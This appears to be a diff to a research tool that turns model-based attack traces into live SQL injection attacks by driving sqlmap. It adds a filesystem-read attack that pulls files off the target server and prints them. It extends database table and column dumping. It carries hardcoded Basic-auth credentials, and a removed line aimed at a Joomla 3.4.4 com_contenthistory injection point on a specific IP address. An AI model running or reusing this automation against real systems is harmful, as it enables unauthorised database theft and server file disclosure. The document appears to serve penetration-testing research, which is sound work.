@@ -19,9 +19,14 @@ import json
 import threading
 import itertools
 import atexit
+from os import listdir
+from os.path import isfile, join, expanduser
 
 # global request
 s = None
+
+# global attack domain
+attack_domain = ""
 
 def exitcleanup():
     print("exiting22")
@@ -29,11 +34,13 @@ def exitcleanup():
 # takes an attack trace and an extension matrix, and execute the attack
 def execute_attack(msc_table,extension_sqli,file_aslanpp):
     global s
+    global attack_domain
     cprint("Executing the attack trace")
 
     # load the concretization file
     with open(config.concretization,"r") as data_file:
          concretization_data = json.load(data_file)
+    attack_domain = concretization_data["domain"]
 
     atexit.register(exitcleanup)
 
@@ -76,13 +83,22 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
         # 3: sqli.lfi identifies a sql-injection for reading
         # 4: sqli.evil_file identifies a sql-injection for writing
         # intruder step, the only we are interested into
+            if "r" in extension_sqli[idx][0]:
+                cprint("Filesystem read attack!",color="y")
+                sqlmap_init = __sqlmap_init(message,extension_sqli,concretization_data,idx)
+                __execute_sqlmap(sqlmap_init)
+                # extracted files can be found in ~/.sqlmap/output/<attacked_domani>/files/
+                # list extracted file content
+                __list_extracted_files()
+
+                continue
+                # perform a file reading attack
+            if "w" in extension_sqli[idx][0]:
+                # perform a file writing attack
+                continue
+
+
             if "a" in extension_sqli[idx][0]:
-                if "sqli.lfi" in msc_table[idx][1][2]:
-                    cprint("SQL injection for file reading not supported yet. Aborting!",color="y");
-                    exit(0)
-                if "sqli.evil_file" in msc_table[idx][1][2]:
-                    cprint("SQL injection for file reading not supported yet. Aborting!",color="y");
-                    exit(0)
                 if len(extension_sqli[idx][1]) >= 1:
                    cprint("Data extraction attack!",color="y") 
                    # data extraction, execute sqlmap
@@ -90,7 +106,8 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
                    # for the execution we need (url,method,params,data_to_extract)
                    # data_to_extract => table.column
                    # sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
-                   sqlmap_output = __execute_sqlmap(sqlmap_init)
+                   output = __execute_sqlmap(sqlmap_init)
+                   sqlmap_output = __sqlmap_parse_data_extracted(output)
                    cprint(sqlmap_output,"D")
                    if not sqlmap_output:
                        cprint("No data extracted from the database","W")
@@ -362,11 +379,12 @@ def __execute_sqlmap(sqlmap_details):
     url = sqlmap_details["url"]
     method = sqlmap_details["method"]
     params = sqlmap_details["params"]
-    data_to_extract = sqlmap_details["extract"]
 
-    cprint("Execute sqlmap")
+    cprint("run sqlmapapi.py")
     sqlmap.run_api_server()
     task = sqlmap.new_task()
+
+    # hardcoded configuration for the univr server
     sqlmap.set_option("authType","Basic",task)
     sqlmap.set_option("authCred","regis:password",task)
     sqlmap.set_option("dropSetCookie","false",task)
@@ -381,35 +399,49 @@ def __execute_sqlmap(sqlmap_details):
     elif method == "POST":
         sqlmap.set_option("url",url,task)
         sqlmap.set_option("data",url_params,task)
-    sqlmap.set_option("dumpTable","true",task)
-    for tblcol in data_to_extract:
-        tbl_list = tblcol.split(".")
-        cprint(tbl_list[0],"D")
-        sqlmap.set_option("tbl",tbl_list[0],task)
-        sqlmap.set_option("col",tbl_list[1],task)
 
-    #sqlmap.set_option("data","username=?&password=?",task)
-    #sqlmap.set_option("tbl","users",task)
+    try:
+        data_to_extract = sqlmap_details["extract"]
+        sqlmap.set_option("dumpTable","true",task)
+        # set data extraction only if we have data to extract only if we have data to extract
+        for tblcol in data_to_extract:
+            tbl_list = tblcol.split(".")
+            cprint(tbl_list[0],"D")
+            sqlmap.set_option("tbl",tbl_list[0],task)
+            sqlmap.set_option("col",tbl_list[1],task)
+    except KeyError:
+        pass
+    try:
+        file_to_extract = sqlmap_details["read"]
+        # ask if you want to change the file or continue ? 
+        sqlmap.set_option("rFile",file_to_extract,task)
+    except KeyError:
+        pass
 
-    sqlmap.start_scan("https://157.27.244.25/joomla3.4.4/index.php?list[select]=?&option=com_contenthistory&view=history",task)
-    #sqlmap.start_scan(url,task)
+    cprint("sqlmap analysis started")
+    sqlmap.start_scan(url,task)
     cprint(url,"D")
     cprint(method,"D")
     cprint(params,"D")
-    cprint(data_to_extract,"D")
 
     stopFlag = threading.Event()
     sqlmap_output = ""
     while not stopFlag.wait(5):
         r = sqlmap.get_status(task)
         if "terminated" in r:
-            cprint("Analysis terminated","V")
+            cprint(sqlmap.get_log(task),"D")
+            cprint("sqlmap analysisnalysis terminated")
             sqlmap_output = sqlmap.get_data(task)
             stopFlag.set()
         else:
-            cprint("Analysis in progress ... ","V")
+            cprint("sqlmap analysis in progress ... ")
             cprint(sqlmap.get_log(task),"D")
+
+    return sqlmap_output
     
+
+
+def __sqlmap_parse_data_extracted(sqlmap_output):
     # Let's parse the data extracted
     cprint(sqlmap_output,"D")
     extracted_values = {}
@@ -435,14 +467,37 @@ def __execute_sqlmap(sqlmap_details):
     return extracted_values
 
 """
+retrieve the list of files extracted by sqlmap
+"""
+def __list_extracted_files():
+    cprint("domain: " + attack_domain,"D")
+    __sqlmap_files_path = expanduser(join("~",".sqlmap","output",attack_domain,"files"))
+
+    try:
+        files = [f for f in listdir(__sqlmap_files_path) if isfile(join(__sqlmap_files_path,f))]
+    except FileNotFoundError:
+        cprint("File not found! " + __sqlmap_files_path,"E")
+        cprint("Aborting execution","E")
+        exit(0)
+    for f in files:
+        cprint("content of file: " +join( __sqlmap_files_path, f))
+        txt = open(join(__sqlmap_files_path,f))
+        print(txt.read())
+
+"""
 Return the initialization structur for executing sqlmap. (Readability method)
 """
 def __sqlmap_init(message,extension_sqli,concretization_data,idx):
+    # message format
+    # ('tag1', ('<i>', 'webapplication', 'u.sqli.secureFile.p.Password(121)'))
+    request_message = message[1][2]
+
     cprint("sqli attack","D")
     cprint(message,"D")
     cprint(extension_sqli[idx],"D")
     tag = message[0]
     
+    # we first deal with the concretization parameters needed for all initialization
     sqli_init = {}
     sqli_init["url"] = concretization_data[tag]["url"]
     sqli_init["method"] = concretization_data[tag]["method"]
@@ -452,22 +507,36 @@ def __sqlmap_init(message,extension_sqli,concretization_data,idx):
         tmp = v.split("=")
         params[tmp[0]] = tmp[1]
     sqli_init["params"] = params
-    # data to extract
-    extract = []
-    exploitations = extension_sqli[idx][1]
-    cprint("Exploitations","D")
-    cprint(exploitations,"D")
-    for row in exploitations:
-          tag = row[0]
-          exploit_points = row[1]
-          for k in exploit_points:
-              try:
-                  tmp_map = concretization_data[tag]["params"][k].split("=")[0]
-              except KeyError:
-                  tmp_map = concretization_data[tag]["headers"][k].split("=")[0]
-              tmp_table = concretization_data[tag]["tables"][tmp_map]
-              extract.append(tmp_table)
-    sqli_init["extract"] = extract
+
+    # this code executes only if we read from filesystem
+    if "r" in extension_sqli[idx][0]:
+        file_read = []
+        # get the name of the file to retrieve
+        tag_file_to_retrieve = re.search(r'sqli\.([a-zA-Z]*)',request_message).group(1)
+        cprint(tag_file_to_retrieve,"D")
+        real_file_to_retrieve = concretization_data["files"][tag_file_to_retrieve]
+        cprint("file to read: " + real_file_to_retrieve,"D")
+        sqli_init["read"] = real_file_to_retrieve
+
+
+    # this code executes only if we extract dara from the database
+    if "a" in extension_sqli[idx][0]:
+        # data to extract
+        extract = []
+        exploitations = extension_sqli[idx][1]
+        cprint("Exploitations","D")
+        cprint(exploitations,"D")
+        for row in exploitations:
+              tag = row[0]
+              exploit_points = row[1]
+              for k in exploit_points:
+                  try:
+                      tmp_map = concretization_data[tag]["params"][k].split("=")[0]
+                  except KeyError:
+                      tmp_map = concretization_data[tag]["headers"][k].split("=")[0]
+                  tmp_table = concretization_data[tag]["tables"][tmp_map]
+                  extract.append(tmp_table)
+        sqli_init["extract"] = extract
     return sqli_init
     
 
